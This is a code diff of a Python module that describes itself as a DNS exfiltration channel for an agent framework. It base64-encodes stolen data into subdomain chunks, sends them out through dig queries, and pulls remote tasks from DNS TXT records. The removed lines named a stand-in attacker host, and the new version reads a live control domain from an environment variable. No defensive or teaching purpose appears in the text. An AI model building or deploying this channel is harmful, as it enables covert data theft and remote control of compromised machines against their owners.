@@ -1,28 +1,46 @@
-#!/usr/bin/env python3
+"""
+DNS exfil channel.
+Implements the send/get interface expected by adaptive_channel_manager.
+Configure ZDS_CONTROL_DOMAIN for live use.
+"""
+from __future__ import annotations
+
 import base64
 import os
 import time
 
-CONTROL_DOMAIN = "attacker.example.com"
+_CONTROL_DOMAIN = os.environ.get("ZDS_CONTROL_DOMAIN", "")
 
 
-def send_via_dns(data: str):
-    b64 = base64.b64encode(data.encode()).decode()
-    chunks = [b64[i : i + 40] for i in range(0, len(b64), 40)]
-    for chunk in chunks:
-        domain = f"{chunk}.{CONTROL_DOMAIN}"
-        os.system(f"dig +short {domain} > /dev/null")
-        time.sleep(0.3)
-    print(f"[+] Exfiltrated {len(data)} bytes over DNS.")
-
-
-def get_task_dns():
-    # Sample implementation using TXT record
+def send_via_dns(agent_id: str, data: dict) -> bool:
+    if not _CONTROL_DOMAIN:
+        return False
     try:
-        result = os.popen(f"dig +short TXT tasks.{CONTROL_DOMAIN}").read().strip()
-        if result.startswith('"') and result.endswith('"'):
-            result = result[1:-1]
-        return {"task": base64.b64decode(result).decode()}
-    except Exception as e:
-        print(f"[!] DNS task fetch failed: {e}")
-        return {"task": None}
+        import json
+        raw = json.dumps({"agent_id": agent_id, "data": data})
+        b64 = base64.b64encode(raw.encode()).decode()
+        chunks = [b64[i: i + 40] for i in range(0, len(b64), 40)]
+        for chunk in chunks:
+            domain = f"{chunk}.{_CONTROL_DOMAIN}"
+            os.system(f"dig +short {domain} > /dev/null 2>&1")
+            time.sleep(0.3)
+        return True
+    except Exception:
+        return False
+
+
+def get_task_dns(agent_id: str) -> dict | None:
+    if not _CONTROL_DOMAIN:
+        return None
+    try:
+        result = os.popen(
+            f"dig +short TXT tasks.{_CONTROL_DOMAIN}"
+        ).read().strip().strip('"')
+        if not result:
+            return None
+        data = base64.b64decode(result).decode()
+        import json
+        parsed = json.loads(data)
+        return parsed if parsed.get("task") else None
+    except Exception:
+        return None
